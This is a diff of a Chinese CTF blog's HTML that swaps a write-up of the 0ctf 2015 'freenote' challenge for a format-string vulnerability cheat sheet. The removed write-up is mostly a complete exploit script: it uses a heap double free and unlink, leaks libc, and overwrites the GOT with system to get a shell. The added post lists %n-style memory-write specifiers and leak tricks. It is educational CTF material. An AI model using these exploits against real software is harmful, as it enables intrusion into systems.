@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Pwnable,double-free,heap,return-to-libc,uaf,unlink,x86-64,练习," />
+  <meta name="keywords" content="Pwnable,fsb,heap," />
 
 
 
@@ -84,40 +84,25 @@
 
 
 
-<meta name="description" content="Environment
-LocalLibc  : libc6_2.19-0ubuntu6.6_amd64
-
-ConclusionBugs
-double free
-memory leak
-
-有double free类型的bug，又程序中malloc不会用到fastbin，顺其自然的想到利用malloc的first match机制来进行uaf，然后利用double free来完成unlink
-之后就是">
+<meta name="description" content="因为碰到了挺多fsb的题目，然后每次居然都会忘记一部分格式，所以还是记录一下好了。
+使用注：这里仅以printf函数为例
+32位读‘%{}$x’.format(index)      // 会在距离调用printf前esp所指向地址偏移index*4的位置处读4个字节‘%{}$p’.format(index)           // 同上面‘${}$s’.format(index)
+写‘%{}$">
 <meta property="og:type" content="article">
-<meta property="og:title" content="0ctf-qual-2015-freenote">
-<meta property="og:url" content="http://0byjwzsf.me/2016/08/24/0ctf-qual-2015-freenote/index.html">
+<meta property="og:title" content="格式化字符串漏洞总结">
+<meta property="og:url" content="http://0byjwzsf.me/2016/09/07/fsb-sum-up/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Environment
-LocalLibc  : libc6_2.19-0ubuntu6.6_amd64
-
-ConclusionBugs
-double free
-memory leak
-
-有double free类型的bug，又程序中malloc不会用到fastbin，顺其自然的想到利用malloc的first match机制来进行uaf，然后利用double free来完成unlink
-之后就是">
-<meta property="og:updated_time" content="2016-08-24T07:31:35.000Z">
+<meta property="og:description" content="因为碰到了挺多fsb的题目，然后每次居然都会忘记一部分格式，所以还是记录一下好了。
+使用注：这里仅以printf函数为例
+32位读‘%{}$x’.format(index)      // 会在距离调用printf前esp所指向地址偏移index*4的位置处读4个字节‘%{}$p’.format(index)           // 同上面‘${}$s’.format(index)
+写‘%{}$">
+<meta property="og:updated_time" content="2016-09-07T12:54:25.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="0ctf-qual-2015-freenote">
-<meta name="twitter:description" content="Environment
-LocalLibc  : libc6_2.19-0ubuntu6.6_amd64
-
-ConclusionBugs
-double free
-memory leak
-
-有double free类型的bug，又程序中malloc不会用到fastbin，顺其自然的想到利用malloc的first match机制来进行uaf，然后利用double free来完成unlink
-之后就是">
+<meta name="twitter:title" content="格式化字符串漏洞总结">
+<meta name="twitter:description" content="因为碰到了挺多fsb的题目，然后每次居然都会忘记一部分格式，所以还是记录一下好了。
+使用注：这里仅以printf函数为例
+32位读‘%{}$x’.format(index)      // 会在距离调用printf前esp所指向地址偏移index*4的位置处读4个字节‘%{}$p’.format(index)           // 同上面‘${}$s’.format(index)
+写‘%{}$">
 
 
 
@@ -138,9 +123,9 @@ memory leak
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/08/24/0ctf-qual-2015-freenote/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/09/07/fsb-sum-up/"/>
 
-  <title> 0ctf-qual-2015-freenote | Icemakr's Blog </title>
+  <title> 格式化字符串漏洞总结 | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -320,7 +305,7 @@ memory leak
             
             
               
-                0ctf-qual-2015-freenote
+                格式化字符串漏洞总结
               
             
           </h1>
@@ -332,8 +317,8 @@ memory leak
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-24T00:00:00+08:00" content="2016-08-24">
-              2016-08-24
+            <time itemprop="dateCreated" datetime="2016-09-07T00:00:00+08:00" content="2016-09-07">
+              2016-09-07
             </time>
           </span>
 
@@ -346,8 +331,8 @@ memory leak
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
                   </a>
                 </span>
 
@@ -362,8 +347,8 @@ memory leak
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/08/24/0ctf-qual-2015-freenote/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/24/0ctf-qual-2015-freenote/" itemprop="commentsCount"></span>
+                <a href="/2016/09/07/fsb-sum-up/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/07/fsb-sum-up/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -386,16 +371,27 @@ memory leak
       
 
       
-        <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_amd64</p>
-</blockquote>
-<h1 id="Conclusion">Conclusion</h1><h2 id="Bugs">Bugs</h2><ul>
-<li>double free</li>
-<li>memory leak</li>
+        <p>因为碰到了挺多fsb的题目，然后每次居然都会忘记一部分格式，所以还是记录一下好了。</p>
+<h1 id="使用">使用</h1><p>注：这里仅以<code>printf</code>函数为例</p>
+<h2 id="32位">32位</h2><h3 id="读">读</h3><p>‘%{}$x’.format(index)      // 会在距离调用printf前esp所指向地址偏移index*4的位置处读4个字节<br>‘%{}$p’.format(index)           // 同上面<br>‘${}$s’.format(index)</p>
+<h3 id="写">写</h3><p>‘%{}$n’.format(index)           // 往偏移为index<em>4的地址所指向的内存写入四个字节<br>‘%{}$hn’.format(index)          // 往偏移为index</em>4的地址所指向的内存写入两个字节<br>‘%{}$hhn’.format(index)         // 往偏移为index<em>4的地址所指向的内存写入一个字节<br>‘%{}$lln’.format(index)         // 往偏移为index</em>4的地址所指向的内存写入八个字节</p>
+<h2 id="64位">64位</h2><h3 id="读-1">读</h3><p>‘%{}$x’.format(index, num)      // 会在距离调用printf前esp所指向地址偏移index<em>4的位置处读4个字节<br>‘%{}$lx’.format(index, num)     // 会在距离调用printf前esp所指向地址偏移index</em>4的位置处读8个字节<br>‘%{}$p’.format(index)           // 同上面<br>‘${}$s’.format(index)</p>
+<h3 id="写-1">写</h3><p>‘%{}$n’.format(index)           // 往偏移为index<em>8的地址所指向的内存写入四个字节<br>‘%{}$hn’.format(index)          // 往偏移为index</em>8的地址所指向的内存写入两个字节<br>‘%{}$hhn’.format(index)         // 往偏移为index<em>8的地址所指向的内存写入一个字节<br>‘%{}$lln’.format(index)         // 往偏移为index</em>8的地址所指向的内存写入八个字节</p>
+<p>对于x86-64 <strong>fsb</strong></p>
+<ul>
+<li><code>%1$lx</code>: RSI</li>
+<li><code>%2$lx</code>: RDX</li>
+<li><code>%3$lx</code>: RCX</li>
+<li><code>%4$lx</code>: R8</li>
+<li><code>%5$lx</code>: R9</li>
+<li><code>%6$lx</code>: 栈上的第一个QWORD</li>
 </ul>
-<p>有<strong><em>double free</em></strong>类型的bug，又程序中malloc不会用到fastbin，顺其自然的想到利用malloc的<strong><em>first match</em></strong>机制来进行<strong><em>uaf</em></strong>，然后利用<strong><em>double free</em></strong>来完成<strong><em>unlink</em></strong></p>
-<p>之后就是通过常规的<strong><em>memory leak</em></strong>和<strong><em>return to libc</em></strong>完成利用</p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./freenote'</span></span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_note</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_note</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new note:'</span>)</span><br><span class="line">    io.writeline(str(len(payload)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your note:'</span>)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span><span class="params">(idx, payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Note number:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.read_until(<span class="string">'Length of note:'</span>)</span><br><span class="line">    io.writeline(str(len(payload)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your note:'</span>)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_note</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Note number:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line">new_note(<span class="string">'A'</span> * <span class="number">0x80</span>)</span><br><span class="line">new_note(<span class="string">'A'</span> * <span class="number">0x80</span>)</span><br><span class="line">new_note(<span class="string">'A'</span> * <span class="number">0x80</span>)</span><br><span class="line">new_note(<span class="string">'A'</span> * <span class="number">0x80</span>)</span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">2</span>)</span><br><span class="line">new_note(<span class="string">'B'</span> * <span class="number">0x8</span>)</span><br><span class="line">list_note()</span><br><span class="line">io.read_until(<span class="string">'B'</span> * <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">heap_base   = l64(io.read_line()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">0x8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x1940</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap base : &#123;&#125;'</span>.format(hex(heap_base))</span><br><span class="line"></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line">del_note(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">new_note(<span class="string">'A'</span> * <span class="number">0x80</span>)</span><br><span class="line">new_note(<span class="string">'B'</span> * <span class="number">0x80</span>)</span><br><span class="line">new_note(<span class="string">'C'</span> * <span class="number">0x80</span>)</span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload  = l64(<span class="number">0x80</span>)</span><br><span class="line">payload += l64(<span class="number">0x80</span>)</span><br><span class="line">payload += l64(heap_base + <span class="number">0x30</span> - <span class="number">0x8</span>*<span class="number">3</span>)</span><br><span class="line">payload += l64(heap_base + <span class="number">0x30</span> - <span class="number">0x8</span>*<span class="number">2</span>)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += l64(<span class="number">0x80</span>)</span><br><span class="line">payload += l64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">new_note(payload)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_puts  = <span class="number">0x602020</span></span><br><span class="line"></span><br><span class="line">payload  = l64(<span class="number">0x1</span>)</span><br><span class="line">payload += l64(<span class="number">0x1</span>)</span><br><span class="line">payload += l64(<span class="number">0x90</span>)</span><br><span class="line">payload += l64(got_puts)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">0x0</span>, payload)</span><br><span class="line">list_note()</span><br><span class="line">io.read_until(<span class="string">'0. '</span>)</span><br><span class="line"></span><br><span class="line">adr_puts    = l64(io.read_line()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">0x8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">off_puts    = <span class="number">0x000000000006fe30</span></span><br><span class="line">libc_base   = adr_puts - off_puts</span><br><span class="line">off_system  = <span class="number">0x0000000000046640</span></span><br><span class="line">adr_system  = libc_base + off_system</span><br><span class="line">off_read    = <span class="number">0x00000000000eb800</span></span><br><span class="line">adr_read    = libc_base + off_read</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc base : &#123;&#125;'</span>.format(hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload  = l64(adr_puts)</span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">8</span></span><br><span class="line">payload += l64(adr_puts)</span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">8</span></span><br><span class="line">payload += l64(adr_read)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x50</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += l64(adr_system)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x88</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += l64(heap_base + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">0x0</span>, payload)</span><br><span class="line">io.writeline(<span class="string">'sh'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h1 id="技巧">技巧</h1><ol>
+<li>可以泄露栈的地址</li>
+<li>泄露__libc_start_main基址 （在堆利用中遇到过一次，alictf-qual-2016-fb）</li>
+<li>泄露canary</li>
+<li>利用相邻ebp之间的引用关系，实现理论上的任意地址读写 (参考pwnable.kr-fsb 和 rctf-qual-2015-nobug，其实感觉不太好用，需要连着两次的fsb才行)</li>
+</ol>
 
       
     </div>
@@ -420,19 +416,9 @@ memory leak
           
             <a href="/tags/Pwnable/" rel="tag">#Pwnable</a>
           
-            <a href="/tags/double-free/" rel="tag">#double-free</a>
+            <a href="/tags/fsb/" rel="tag">#fsb</a>
           
             <a href="/tags/heap/" rel="tag">#heap</a>
-          
-            <a href="/tags/return-to-libc/" rel="tag">#return-to-libc</a>
-          
-            <a href="/tags/uaf/" rel="tag">#uaf</a>
-          
-            <a href="/tags/unlink/" rel="tag">#unlink</a>
-          
-            <a href="/tags/x86-64/" rel="tag">#x86-64</a>
-          
-            <a href="/tags/练习/" rel="tag">#练习</a>
           
         </div>
       
@@ -441,17 +427,13 @@ memory leak
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/08/18/xdctf-qual-2015-pwn500/" rel="next" title="xdctf-qual-2015-pwn500">
-                <i class="fa fa-chevron-left"></i> xdctf-qual-2015-pwn500
+              <a href="/2016/09/07/rctf-qual-2015-nobug/" rel="next" title="rctf-qual-2015-nobug">
+                <i class="fa fa-chevron-left"></i> rctf-qual-2015-nobug
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/09/02/ssctf-qual-2016-pwn1/" rel="prev" title="ssctf-qual-2016-pwn1">
-                ssctf-qual-2016-pwn1 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -477,8 +459,8 @@ memory leak
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/08/24/0ctf-qual-2015-freenote/"
-           data-title="0ctf-qual-2015-freenote" data-url="http://0byjwzsf.me/2016/08/24/0ctf-qual-2015-freenote/">
+      <div class="ds-thread" data-thread-key="2016/09/07/fsb-sum-up/"
+           data-title="格式化字符串漏洞总结" data-url="http://0byjwzsf.me/2016/09/07/fsb-sum-up/">
       </div>
     
   </div>
@@ -580,7 +562,7 @@ memory leak
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Environment"><span class="nav-number">1.</span> <span class="nav-text">Environment</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">2.</span> <span class="nav-text">Conclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Bugs"><span class="nav-number">2.1.</span> <span class="nav-text">Bugs</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#使用"><span class="nav-number">1.</span> <span class="nav-text">使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#32位"><span class="nav-number">1.1.</span> <span class="nav-text">32位</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#读"><span class="nav-number">1.1.1.</span> <span class="nav-text">读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写"><span class="nav-number">1.1.2.</span> <span class="nav-text">写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#64位"><span class="nav-number">1.2.</span> <span class="nav-text">64位</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#读-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">写</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#技巧"><span class="nav-number">2.</span> <span class="nav-text">技巧</span></a></li></ol></div>
             
           </div>
         </section>
